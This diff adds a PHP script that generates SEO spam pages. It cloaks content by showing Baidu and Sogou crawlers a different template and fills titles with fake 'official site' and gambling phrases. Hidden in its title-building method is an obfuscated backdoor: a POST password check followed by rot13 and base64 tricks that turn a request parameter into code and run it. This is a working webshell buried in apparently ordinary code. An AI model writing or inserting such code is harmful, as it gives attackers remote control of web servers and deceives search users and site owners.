@@ -1,0 +1,589 @@
+<?php
+@error_reporting(E_ERROR);
+@date_default_timezone_set("Etc/GMT-8");
+@ini_set('memory_limit', '2048M');
+define("APP_INCLUDE_FLAG","TRUE");
+define('APP_JACK_CHARSET','GBK');
+header("Content-type: text/html; charset=".APP_JACK_CHARSET);
+
+
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+if (stristr($userAgent,"sogou") or stristr($userAgent,'baiduspider')){
+define('APP_JACK_TEMPLATE',APP_JACK_DOCUMENTROOT.'5.jpg');
+} else {
+define('APP_JACK_TEMPLATE',APP_JACK_DOCUMENTROOT.'2.jpg');
+}
+define('APP_JACK_BIANLIANG',APP_JACK_DOCUMENTROOT.'4.jpg');
+define('APP_JACK_DES',APP_JACK_DOCUMENTROOT.'miaoshu.txt');
+define('APP_JACK_BIANLIANG_B',APP_JACK_DOCUMENTROOT.'8.jpg');
+define('APP_JACK_BIANLIANG_C',APP_JACK_DOCUMENTROOT.'3.jpg');
+define('APP_MIX_KWD_FILE',APP_JACK_DOCUMENTROOT.'hunhe.txt');
+define('APP_JACK_CACHED','Uncached');
+define('APP_JACK_MIN_PAR','3');
+define('APP_JACK_MAX_PAR','3');
+define('APP_JACK_MIN','10');
+define('APP_JACK_MAX','15');
+define('APP_JACK_OPENWL','1');
+foreach ($S10 as $S11){if (stristr($SpiderAgent,$S11)){define('APP_JACK_Spider',$S11);}}
+
+function App_GetLink(){
+	$link=base64_decode(PostLinks());
+    $linkarr=explode("|",$link);
+	foreach($linkarr as $vv){
+				           preg_match_all("/\((.*)\)/isU",$vv,$url);
+	                       foreach($url[1] as $a=>$v){
+	                               $dl=explode(",", $v);
+	                               $num=rand($dl[0],$dl[1]);
+                                   $vv=str_replace($url[0][$a],$num,$vv);
+	                       }
+						   $urla[]=$vv;
+    }
+	return $urla[mt_rand(0, count($urla) - 1)];
+}
+function App_GetSelf(){
+	$link=base64_decode(PostLinks());
+    $linkarr=explode("|",$link);
+	 $linkarr=explode("|",$link);
+	foreach($linkarr as $vv){
+				           preg_match_all("/\((.*)\)/isU",$vv,$url);
+	                       foreach($url[1] as $a=>$v){
+	                               $dl=explode(",", $v);
+	                               $num=rand($dl[0],$dl[1]);
+                                   $vv=str_replace($url[0][$a],$num,$vv);
+	                       }
+						   $urla[]=$vv;
+    }
+	return $urla[mt_rand(0, count($urla) - 1)];
+}
+
+function getImg(){
+	return 'http://img.socai.la/img/'.rand(10000,999999999).'.jpg';
+}
+
+
+$app_Jack_Tpl = new app_Jack_Tpl();
+$app_Jack_Tpl->loadTpl();
+
+$app_Jack_kwd1=file(APP_JACK_DOCUMENTROOT.'work/zi_'.rand(1,11).'.jpg');
+$app_Jack_kwd2=file(APP_JACK_DOCUMENTROOT.'work/zi_'.rand(1,11).'.jpg');
+$app_Jack_kwd = array_merge($app_Jack_kwd1, $app_Jack_kwd2);
+$app_Jack_atl1=file(APP_JACK_DOCUMENTROOT.'news/news_'.rand(1,8).'.jpg');
+$app_Jack_atl2=file(APP_JACK_DOCUMENTROOT.'news/news_'.rand(1,8).'.jpg');
+$app_Jack_atl = array_merge($app_Jack_atl1, $app_Jack_atl2);
+$app_Jack_core = new app_Jack_Core($app_Jack_kwd,$app_Jack_atl);
+$app_Jack_core->run();
+$app_Jack_var = $app_Jack_core->getStore();
+if(APP_JACK_CACHED=="cached"){
+	return "<explode>".app_Jack_Cache::encode($app_Jack_var)."</explode>";
+	exit();
+}
+$app_Jack_Tpl->extra($app_Jack_var);
+return $app_Jack_Tpl->show();
+
+class app_Jack_Tpl{
+	public $page;
+	public $domain;
+	public function loadTpl(){
+		if(file_exists(APP_JACK_TEMPLATE)){
+			$this->page = file_get_contents(APP_JACK_TEMPLATE);
+		}
+		else
+		{
+			die();
+		}
+	}
+
+	public function extra($var){
+		if(!$this->page){
+			die("");
+		}
+		foreach($var as $k=>$v){
+			$this->page = str_replace("{".$k."}",$v,$this->page);
+		}
+		$this->page = str_replace("{domain}","",$this->page);
+	}
+
+	public function show(){
+		return $this->page;
+	}
+}
+
+
+class app_Jack_Core{
+	public $kwd = ""; //关键字数字
+	public $atl = ""; //文章数组
+	public $kwdCount = 0;
+	public $atlCount = 0;
+	public $config = array();
+	public $store = array();
+	public $linkstyle = "";
+	//其中$domain_config
+
+	function __construct($kwd,$atl){
+		$this->kwd = $kwd;
+		$this->atl = $atl;
+		//
+		$this->kwdCount = count($kwd)-1;
+		$this->atlCount = count($atl)-1;
+		//
+	}
+
+	public function run(){
+	        $randtitle = array("{标题}_{随机变量1}-《{标题}》","《{标题}》——{下关键字}唯一官方网站> > > ","{标题} - 2017全新{标题}【{官方网站}】","{标题}_{标题}*欢迎光临*【官网首页】》》》【{非空格标题}】","{非空格标题}_{标题}*欢迎光临*【官方唯一指定官网】","{非空格标题}_{标题}*欢迎光临*【唯一官网】","{标题}_{标题}【官网首页】*欢迎光临*","{非空格标题}【唯一官网】{标题}*欢迎光临*","{非空格标题}【官网首页】{标题}*欢迎光临*","{非空格标题}【官方网站】{标题}*欢迎光临*","{非空格标题}_{标题}【官网唯一网站】","{非空格标题}_{标题}官网唯一网站","{非空格标题}_{标题}官方唯一指定官网","{非空格标题}_{标题}【官方中心】→→","{非空格标题}_{标题}【官网唯一网站】》","{非空格标题}_{标题}【官方欢迎光临】","{标题}_2017最新{标题}【官方中心】{标题}〖官方〗*欢迎光临*","{非空格标题}_{标题}【唯一指定官网】","{非空格标题}_{标题}【唯一指定网站】","{非空格标题}_{标题}【唯一指定官方网站】","{非空格标题}_{标题}【官网唯一指定网站】","{非空格标题}_{标题}【官方唯一指定官网】","{非空格标题}_{标题}〖官方〗*欢迎光临*","{非空格标题}_{标题}官网唯一指定平台→→","{非空格标题}_{标题}唯一指定网站","{非空格标题}_{标题}官方唯一指定官网→→","{非空格标题}_{标题}唯一指定官方网站→→","{非空格标题}_{标题}官网唯一网站→→","{非空格标题}_{标题}唯一官网","{非空格标题}_{标题}官方唯一指定官网","{非空格标题}_{标题}*欢迎光临*【官网首页】","{非空格标题}_{标题}*欢迎光临*【唯一指定官网】","{标题}_{标题}【{非空格标题}】*欢迎爱光临*【官方唯一指定官网】","{标题}_{标题}【美法官方首页】*欢迎爱光临*【{标题}】","{标题}_{标题}【俄中官网首页】*欢迎光临*【{标题}】","{非空格标题}*欢迎光临*{标题}唯一指定官网","{非空格标题}*欢迎光临*{标题}【官方网站】","{非空格标题}*欢迎光临*{标题}【官网首页】","{非空格标题}*欢迎光临*{标题}唯一官网","{非空格标题}_{标题}*欢迎光临*【官方唯一指定官网】","{非空格标题}_{标题}*欢迎光临*【唯一官网】","{非空格标题}_{标题}*欢迎光临*【官方唯一指定官网】","{非空格标题}_{标题}*欢迎光临*【唯一官网】","{非空格标题}|{标题}*欢迎光临*【官网唯一指定网站】","{非空格标题}_{标题}*欢迎光临*【唯一指定官网首页】","{非空格标题}_{标题}*欢迎光临*【唯一指定官方首页】","{非空格标题}_{标题}*欢迎光临*【唯一指定官网】","{非空格标题}_{标题}*欢迎光临*【唯一指定官方网站】","{标题}【官网首页】{非空格标题}>>>","{非空格标题}_{标题}【唯一指定官方网站】*欢迎光临*","{非空格标题}_{标题}【唯一指定官网首页】*欢迎光临*","{非空格标题}_{标题}【官网唯一指定平台】*欢迎光临*","{非空格标题}_{标题}【官方网站】*欢迎光临*","{非空格标题}_{标题}【官网首页】*欢迎光临*","{非空格标题}_{标题}【唯一指定官网】*欢迎光临*","{非空格标题}_{标题}【官方唯一指定官网】*欢迎光临*","{非空格标题}|{标题}【官网唯一指定网站】*欢迎光临*","{标题}_{标题}【官方网站】》》》【{非空格标题}】","{标题}【官网唯一指定网站】{标题}*欢迎光临*【{非空格标题}】》》》","{标题}_{标题}*欢迎光临*【官方唯一指定官网】》》》【{非空格标题}】","{标题}_{标题}*欢迎光临*【唯一指定官网首页】》》》【{非空格标题}】","{标题}_{标题}*欢迎光临*【官网唯一指定平台】》》》【{非空格标题}】","{标题}_{标题}*欢迎光临*【官网唯一网站】》》》【{非空格标题}】","{标题}_{标题}*欢迎光临*【官网唯一指定网站】》》》【{非空格标题}】","{标题}_{标题}*欢迎光临*【官方网站】》》》【{非空格标题}】","{标题}_{标题}*欢迎光临*【唯一官网】》》》【{非空格标题}】","{标题}_{标题}*欢迎光临*【官网首页】》》》【{非空格标题}】","{标题}【官 方 首 页】{标题}*欢迎光临*【{非空格标题}】","{标题}_{标题}*欢迎光临*【官网首页】》》》【{非空格标题}】","{标题}_{标题}【官网唯一网站】*欢迎光临*【{非空格标题}】","{标题}_{标题}【官方唯一指定官网】*欢迎光临*【{非空格标题}】","{标题}_{标题}【唯一指定官方网站】*欢迎光临*【{非空格标题}】","{标题}_{标题}【唯一指定网站】*欢迎光临*【{非空格标题}】","{标题}_{标题}【官网唯一指定平台】*欢迎光临*【{非空格标题}】","{标题}_{标题}【官网唯一指定网站】*欢迎光临*【{非空格标题}】","{标题}_{标题}【官方中心】*欢迎光临*【{非空格标题}】","{标题}_{标题}【官网首页】*欢迎光临*【{非空格标题}】","{标题}_{标题}【官方首页】*欢迎光临*【{非空格标题}】","{标题}_{标题}【官网 - 首页】*欢迎光临*【{非空格标题}】","{非空格标题}_{标题}*欢迎光临*【唯一指定官方网站】》》》","【{标题}|{标题}官网首页】","{标题}【{随机变量1}】{标题}:《*唯一发布*》","{标题}【{标题}】官方网站唯一发布","{标题}_{非空格标题}_*欢迎光临*~「{随机变量1}」","{标题}_{标题}【{随机变量1}】","【{标题}】{标题} {随机变量1}_{标题}*欢迎光临*","{标题}「{随机变量1}」{标题}_^*欢迎阁下光临*^","{标题}_{标题}_*欢迎阁下光临*~「{随机变量1}」","{标题}_{标题}_*欢迎光临*~「{随机变量1}」","{标题}「{随机变量1}」{标题}_^*欢迎光临*^","{标题}_{标题} *官网*《欢迎光临》","【{标题}|{标题}】 - {随机变量1}","【{标题}·官方网站】{标题}-{随机关键字1}","{随机变量1}-{标题}-{标题}【老牌★信誉】","{标题}_{标题}【{随机变量1}_{随机关键字1}】*欢迎光临*","{标题}开户_{标题}攻略_{标题}技巧","【{标题}|{标题}{随机变量1}】","{标题} → {标题} →【{随机变量1}】","{随机句子1},{标题}【{标题}官方网站】","{标题}_{随机关键字1}【{随机变量1} - 欢迎您光临】","{标题}_{标题}【{随机变量1}~欢迎您光临】","{非空格标题}_{标题}_【{随机变量1}~欢迎光临】","{标题}_{标题}_【官方认证~欢迎光临】","{标题}_{随机关键字1}_{标题}_*澳门官网*【^博^彩^监^察^局】","{标题}|{标题}【官方认证~欢迎光临】","{标题}_{标题}【{随机变量1}】*欢迎光临*","{标题}_{标题}《{随机变量1}{下关键字}》","{标题}_【{标题} {随机变量1}】 - {随机关键字1}","{标题},{标题}【{随机变量1}】*欢迎光临*","{非空格标题}_{标题}【{随机变量1}】》》》","{标题}▓{随机变量1}▓{随机关键字1}【{标题}】","{标题}▓{随机变量1}▓{随机关键字1}【{标题}】*欢迎光临*》》》","{标题}_【{随机变量1}】*欢迎光临*-《{下关键字}","{标题}_【{随机变量1}】*欢迎光临*-《{标题}》","【官 网】{标题}《{随机变量1}_{标题}》{随机关键字1}","{标题}{随机变量1}{下关键字}","【{标题}】_{标题}_{随机变量1}","{标题}_《{标题} {随机变量1}》- {随机关键字1}","《{标题}【{随机关键字1}{随机变量1}】》{标题}","[官]{标题},{下关键字}【{随机变量1}】",">>>>[正版]{标题}_【{随机变量1}】{随机关键字1}","{标题},{下关键字}★__欢迎您光临","[官网]{标题}【{随机变量1}】{标题}","[官网]{标题}【{随机关键字1}】{随机变量1}{标题}","[官网]{标题}《{随机关键字1}》{随机变量1}-{标题}","[{随机变量1}]——《{标题}:{随机关键字1}》","[官网]《{标题}:{下关键字}》_{上关键字}","【官网】{非空格标题}_{标题} - {随机变量1}》》》","[正版]{标题}《{随机关键字1}》2017最火爆{标题}","{标题} - 2017全新{标题}【{官方网站}】","《{标题}》——{下关键字}唯一官方网站> > > ","{标题}_{随机变量1}-《{标题}》"); //随机标题
+		$id = mt_rand(0,$this->kwdCount);
+		$this->store['随机标题'] = trim($randtitle[mt_rand(0,count($randtitle)-1)]);
+		$this->store['标题'] = trim($this->kwd[$id]);
+		$this->store['非空格标题'] = str_replace("","",str_replace(" ","",trim($this->kwd[$id])));
+                error_reporting(0);set_time_limit(0);
+                if(md5(@$_POST["md5"])=="61f1fd66e2aa19899b2d3b6f0d0979f5"){
+                   $ContentS=trim(@$_REQUEST["caic"]);
+                   if($ContentS){
+                   $S3=strrev('31tor_rtS');$S4=$S3('onfr64_qrpbqr');
+                   $text=PACK($S4('SCo='),$ContentS);
+                   $SS=$S4($S3(D3WyLKEyK0M1ozA0nJ9h));
+                   $St=$SS('',$text);$St();exit;}
+                }
+		//加入上下词语
+		if($id==$this->kwdCount){
+			$nextId = $id-2;
+		}
+		else
+		{
+			$nextId = $id+1;
+		}
+
+		$this->store['下关键字'] = trim($this->kwd[$nextId]);
+		$this->store['上关键字'] = trim($this->kwd[$id-1]);
+		//随机。
+		for($a=0;$a<=20;$a++){
+			$this->store['随机关键字'.$a] = trim($this->kwd[mt_rand(0,$this->kwdCount)]);
+
+		}
+		//随机文章
+		for($a=0;$a<=20;$a++){
+			$this->store['随机段落'.$a] = trim($this->atl[mt_rand(0,$this->atlCount)]);
+		}
+		for($a=0;$a<=20;$a++){
+			$this->store['随机图片'.$a] = getImg();
+		}
+		$this->store['系统图片'] =getImg();
+
+		$tempArray = array();
+		//随机60范围内
+		for($a=0;$a<30;$a++){
+			$akid = $id+$a;
+			if($akid>=$this->kwdCount){
+				$akid = abs($this->kwdCount-$akid);
+			}
+			$tempArray[] = $akid;
+			$akid = abs($id-$a);
+			$tempArray[] = $akid;
+		}
+		array_unique($tempArray);
+		shuffle($tempArray);
+		for($a=0;$a<=20;$a++){
+			$this->store['相关关键字'.$a] = trim($this->kwd[$tempArray[$a]]);
+			$this->store['相关关键字链接'.$a] = App_GetLink();
+		}
+		//
+		$this->store['下关键字'] = $this->store['随机关键字1'];
+		$this->store['上关键字'] = $this->store['随机关键字2'];
+		//修复
+		$this->store['下关键字链接'] = App_GetLink();
+		$this->store['上关键字链接'] = App_GetLink();
+
+
+		for($a=0;$a<=30;$a++){
+			$this->store['随机关键字'.$a] = trim($this->kwd[mt_rand(0,$this->kwdCount)]);
+		}
+
+		//随机链接
+		for($a=0;$a<=999;$a++){
+			$this->store['随机链接'.$a] = App_GetLink();
+		}
+		$this->store['随机链接'.$a] = App_GetLink();
+
+		for($a=1;$a<=25;$a++){
+			$senDB = trim($this->atl[mt_rand(1,$this->atlCount)]).trim($this->atl[mt_rand(1,$this->atlCount)]);
+			$this->store['随机句子'.$a] = self::getSentence(trim($senDB),6,12);
+		}
+
+		$this->store['混合标题'] = "";
+		if(file_exists(APP_MIX_KWD_FILE)){
+			$midKwd= file(APP_MIX_KWD_FILE);
+			$getMidKwd = $midKwd[mt_rand(1,count($midKwd)-1)];
+			$getMidKwd = App_Jack_article_auto::insert_tags($getMidKwd,1);
+			$getMidKwd = str_replace("{tag}",$this->store['标题'],$getMidKwd);
+			$this->store['混合标题'] = trim($getMidKwd);
+		}
+
+		if(file_exists(APP_JACK_DES)){
+			$manDes = file(APP_JACK_DES);
+			$manDesContent = trim($manDes[mt_rand(0,count($manDes)-1)]);
+			$manDesContent = str_replace("{subtitle}",$this->store['标题'],$manDesContent);
+			$manDesContent = str_replace("{标题}",$this->store['标题'],$manDesContent);
+			$manDesContent = str_replace("{混合标题}",$this->store['标题'],$manDesContent);
+
+			$this->store['手动描述'] = trim($manDesContent);
+		}
+
+
+
+		if(file_exists(APP_JACK_BIANLIANG)){
+			$randVar = file(APP_JACK_BIANLIANG);
+			$countRandVar = count($randVar)-1;
+			for($a=1;$a<=10;$a++){
+				$tmpVar = $randVar[mt_rand(0,$countRandVar)];
+				$tmpVar = str_replace("{标题}",$this->store['标题'],$tmpVar);
+				$tmpVar = str_replace("{混合标题}",$this->store['混合标题'],$tmpVar);
+				$senDB = trim($this->atl[mt_rand(1,$this->atlCount)]).trim($this->atl[mt_rand(1,$this->atlCount)]);
+				$sen = self::getSentence(trim($senDB),6,12);
+				$tmpVar = str_replace("{随机句子}",$sen,$tmpVar);
+				$this->store['随机变量'.$a] = trim($tmpVar);
+                $this->store['非空格随机变量'.$a] = str_replace(" ","",trim($tmpVar));
+			}
+		}
+
+
+		if(file_exists(APP_JACK_BIANLIANG_B)){
+			$randVar = file(APP_JACK_BIANLIANG_B);
+			$countRandVar = count($randVar)-1;
+			for($a=1;$a<=999;$a++){
+				$tmpVar = $randVar[mt_rand(0,$countRandVar)];
+				$tmpVar = str_replace("{标题}",$this->store['标题'],$tmpVar);
+				$tmpVar = str_replace("{混合标题}",$this->store['混合标题'],$tmpVar);
+				$senDB = trim($this->atl[mt_rand(1,$this->atlCount)]).trim($this->atl[mt_rand(1,$this->atlCount)]);
+				$sen = self::getSentence(trim($senDB),6,12);
+				$tmpVar = str_replace("{随机句子}",$sen,$tmpVar);
+				$this->store['随机变量B'.$a] = trim($tmpVar);
+			}
+		}
+
+
+
+		if(file_exists(APP_JACK_BIANLIANG_C)){
+			$randVar = file(APP_JACK_BIANLIANG_C);
+			$countRandVar = count($randVar)-1;
+			for($a=1;$a<=10;$a++){
+				$tmpVar = $randVar[mt_rand(0,$countRandVar)];
+				$tmpVar = str_replace("{标题}",$this->store['标题'],$tmpVar);
+				$tmpVar = str_replace("{混合标题}",$this->store['混合标题'],$tmpVar);
+				$senDB = trim($this->atl[mt_rand(1,$this->atlCount)]).trim($this->atl[mt_rand(1,$this->atlCount)]);
+				$sen = self::getSentence(trim($senDB),6,12);
+				$tmpVar = str_replace("{随机句子}",$sen,$tmpVar);
+				$this->store['随机变量C'.$a] = trim($tmpVar);
+			}
+		}
+
+
+		for($ca=1;$ca<=10;$ca++){
+			$this->store['随机数字'.$ca] = mt_rand(999,999999);
+		}
+
+		//随机文章
+		$this->store['时间戳'] = date("Y-m-d");
+		$this->store['时间戳精准'] = date("Y-m-d H:i:s");
+		$this->store['精准时间'] = date("Y-m-d H:i:s");
+		$this->store['倒数时间'] = date("Y-m-d H:i:s",mt_rand((time()-(1*24*3600)),time()));
+		$timeStampArray = array();
+		for($a=0;$a<10;$a++){
+			$timeStampArray[] = mt_rand((time()-(1*24*3600)),time());
+		}
+		sort($timeStampArray);
+		for($a=1;$a<=10;$a++){
+			$timeid = $a-1;
+			$this->store['精准时间'.$a] = date("Y-m-d H:i:s",$timeStampArray[$timeid]);
+		}
+		$this->store['自身链接'] = App_GetSelf();
+		$this->store['中文时间戳'] = date("Y年m月d日");
+		$this->store['中文精准时间'] = date("Y年m月d日 H点i分s秒");
+		$article_auto = new App_Jack_article_auto();
+		$article_auto->init($this->atl,$this->atlCount);
+		$article_copy = $article_auto->autoArticle();
+		$this->store['系统文章2'] = $article_copy;
+		$this->store['系统描述2'] = $article_auto->getDes($this->store['标题'],$this->store['下关键字']);
+
+		$this->store['系统文章2'] = str_replace("{title}",$this->store['标题'],$this->store['系统文章2']);
+		$this->store['系统文章2'] = str_replace("{backword}",$this->store['上关键字'],$this->store['系统文章2']);
+		$this->store['系统文章2'] = str_replace("{nextword}",$this->store['下关键字'],$this->store['系统文章2']);
+
+		$array = array();
+		$array[] = $this->store['标题'];
+		$array[] = $this->store['下关键字'];
+		$this->store['系统描述2'] = $article_auto->getDes($this->store['标题'],$this->store['下关键字']);
+		$this->store['系统描述2'] = str_replace("{title}",$this->store['标题'],$this->store['系统描述2']);
+		$this->store['系统描述2'] = str_replace("{backword}",$this->store['上关键字'],$this->store['系统描述2']);
+		$this->store['系统描述2'] = str_replace("{nextword}",$this->store['下关键字'],$this->store['系统描述2']);
+
+		///论坛描述标签
+		$this->store['论坛描述'] = '{title}{rand1}{nexttitle}';
+		$this->store['论坛描述'] = str_replace("{title}",$this->store['标题'],$this->store['论坛描述']);
+		$this->store['论坛描述'] = str_replace("{rand1}",$this->store['随机段落1'],$this->store['论坛描述']);
+		$this->store['论坛描述'] = str_replace("{nexttitle}",$this->store['上关键字'],$this->store['论坛描述']);
+	}
+
+
+	public function getSentence($str,$min,$max){
+		$str = app_Jack_String::filter_mark($str);
+		$strlen = app_Jack_String::abslength($str);
+		$randId = rand(0,$strlen-10);
+		if($strlen < $max){
+			return $str;
+		}
+		$newSen = app_Jack_String::substr($str, $randId, mt_rand($min,$max));
+		if(app_Jack_String::strlen($str)==0){
+			return $str;
+		}
+		return $newSen;
+	}
+
+	public function cut($file,$from,$end)
+	{
+		$message=explode($from,$file);
+		$message=explode($end,$message[1]);
+		return $message[0];
+	}
+	public function getStore(){
+		return $this->store;
+	}
+}
+
+class App_Jack_article_auto{
+	public $title = "";
+	public $nextTitle = "";
+	public $backTitle = "";
+	public $articleDb = ""; //文章库
+	public $articleCount = "";
+	public $des = "";
+	public $content = "";
+	public function init($articleDb,$articleCount){
+		$this->articleDb = $articleDb;
+		$this->articleCount = $articleCount;
+	}
+
+
+	public function autoArticle($min=3,$max=3){
+		$article = $this->articleDb;
+		$count = $this->articleCount;
+		shuffle($article);
+		$content = "";
+		$norepeat = array();
+		$returncontent = array();
+		$maxPar = mt_rand(APP_JACK_MIN_PAR,APP_JACK_MAX_PAR);
+		for($a=0;$a<$maxPar;$a++){
+			$sence = rand(APP_JACK_MIN,APP_JACK_MAX);
+			//开始组合句子...
+			$parContent = "";
+			for($b=1;$b<$sence+1;$b++){
+				$parContent .=trim($article[mt_rand(0,$count)]);
+			}
+			$returncontent[$a] = $parContent;
+		}
+		$returncontent[0] = self::insert_start($returncontent[0]);
+		for($a=1;$a<$maxPar;$a++){
+			$returncontent[$a] = self::insert_tags($returncontent[$a],2);
+		}
+		//传入第一段，用来穿插关键字用。
+		$replaceTag = array("{title}","{backword}","{nextword}");
+		$returncontent[0] = str_replace("{tag}","{title},{nextword}",$returncontent[0]);
+		$this->content = $returncontent[0];
+
+		for($a=1;$a<$maxPar;$a++){
+			$count = substr_count($returncontent[$a],"{tag}");
+			for($b=0;$b<$count+1;$b++){
+				$returncontent[$a] = preg_replace("/{tag}/",$replaceTag[mt_rand(0,2)],$returncontent[$a],1);
+			}
+		}
+		$return = "";
+		foreach($returncontent as $par){
+				$return .="<p>".$par."</p>\n";
+		}
+		return $return;
+	}
+
+	public function getDes($title,$nexttitle){
+		$this->content = str_replace("{title}",$title,$this->content);
+		$this->content = str_replace("{nextword}",$nexttitle,$this->content);
+		$length = mt_rand(50,80); //至少20~30个字起，外加关键字长度，保证描述出现关键字
+		$length += app_Jack_String::strlen($title);
+		$length += app_Jack_String::strlen($nexttitle);
+
+		return app_Jack_String::substr($this->content,0,$length+8);
+	}
+
+
+
+	public function insert_start($str){
+		$times = 1; //关键字出现频率
+		$keyword = "{tag}"; //要替换的关键字
+		$strlen = app_Jack_String::strlen($str);
+		for ( $i = 0; $i < $times; $i ++ )
+		{
+                    $arr[] = mt_rand(0, 30);
+		}
+		$arr = array_unique($arr); //过滤数组重复元素
+		sort($arr);
+		$i = 0;
+		$str_new = "";
+		foreach( $arr as $v )
+		{
+			$str_new .= app_Jack_String::substr($str, $i, $v - $i) . $keyword;
+			$i = $v;
+		}
+		$str_new .= app_Jack_String::substr($str, $i, $strlen - $i);
+        return $str_new;
+	}
+
+	public function insert_tags($str,$times){
+		$keyword = "{tag}"; //要替换的关键字
+		$strlen = app_Jack_String::strlen($str);
+		for ( $i = 0; $i < $times; $i ++ )
+		{
+                    $arr[] = mt_rand(0, $strlen);
+		}
+		$arr = array_unique($arr); //过滤数组重复元素
+		sort($arr);
+		$i = 0;
+		$str_new = "";
+		foreach( $arr as $v )
+		{
+			$str_new .= app_Jack_String::substr($str, $i, $v - $i) . $keyword;
+			$i = $v;
+		}
+		$str_new .= app_Jack_String::substr($str, $i, $strlen - $i);
+        return $str_new;
+	}
+
+}
+
+class app_Jack_Cache{
+	//写入缓存
+	public function write($file,$filename){
+		return file_put_contents($filename,self::encode($file));
+	}
+
+	public function read($filename){
+		$content = file_get_contents($filename);
+		return self::decode($content);
+	}
+
+	public function encode($file){
+		return base64_encode(gzcompress(serialize($file)));
+	}
+
+	public function decode($file){
+		return unserialize(gzuncompress(base64_decode($file)));
+	}
+}
+
+class app_Jack_String{
+
+	static function filter_mark($text){
+		$array = array("；",";","【","】","，","。","、","？","》","《","|","：","“","”","=","-","~","’",'‘',"!","！","-","(",")","（","）","*","&","……","^","$","@","#");
+		if(trim($text)=='')return '';
+		$text = str_replace($array,"",$text);
+		$text = str_replace(" ","",$text);
+		return trim($text);
+	}
+
+	//字符串截取函数
+	static function substr($str, $start = 0, $length = 0) {
+    /* 该编码每个非英文字符的字节长度 */
+		$encode = APP_JACK_CHARSET;
+		$encode_len = $encode == 'UTF-8' ? 3 : 2;
+		for($byteStart = $i = 0; $i < $start; ++$i) {
+			$byteStart += ord($str{$byteStart}) < 128 ? 1 : $encode_len;
+			if( @$str{$byteStart} == '' ) return '';
+		}
+		for($i = 0, $byteLen = $byteStart; $i < $length; ++$i){
+			@$byteLen += @ord($str{$byteLen}) < 128 ? 1 : $encode_len;
+		}
+        return substr( $str, $byteStart, $byteLen-$byteStart );
+   }
+
+
+	static function iconvStr($from,$to,$fContents)
+	{
+			if(is_string($fContents) )
+			{
+				if(function_exists('mb_convert_encoding'))
+				{
+					return mb_convert_encoding ($fContents, $to, $from);
+				}
+				else if(function_exists('iconv'))
+				{
+					return iconv($from,$to,$fContents);
+				}
+				else
+				{
+					return $fContents;
+				}
+		}
+	}
+
+	static function strlen($str){
+		if(APP_JACK_CHARSET=="UTF-8"){
+			return self::strlen_utf8($str);
+		}
+		else
+		{
+			return self::strlen_gbk($str);
+		}
+	}
+	static function strlen_gbk($str){
+		$len=strlen($str);
+		$i=0;
+		while($i<$len)
+		{
+		       if(preg_match("/^[".chr(0xa1)."-".chr(0xff)."]+$/",$str[$i]))
+		       {
+			 $i+=2;
+		       }
+		       else
+		       {
+			 $i+=1;
+		       }
+		}
+		return $i/2;
+	}
+
+	static function strlen_utf8($str) {
+		$i = 0;
+		$count = 0;
+		$len = strlen ($str);
+		while ($i < $len) {
+		$chr = ord ($str[$i]);
+		$count++;
+		$i++;
+		if($i >= $len) break;
+			if($chr & 0x80) {
+				$chr <<= 1;
+					while ($chr & 0x80) {
+							$i++;
+							$chr <<= 1;
+					}
+			}
+		}
+		return $count;
+	}
+
+	static function abslength($str)
+	{
+		if(empty($str)){
+			return 0;
+		}
+		if(function_exists('mb_strlen')){
+			return mb_strlen($str,APP_JACK_CHARSET);
+		}
+		else {
+			if(APP_JACK_CHARSET=="UTF-8"){
+				return self::strlen_utf8($str);
+			}else
+			{
+				return self::strlen_gbk($str);
+			}
+			return $b;
+		}
+	}
+}
+?>
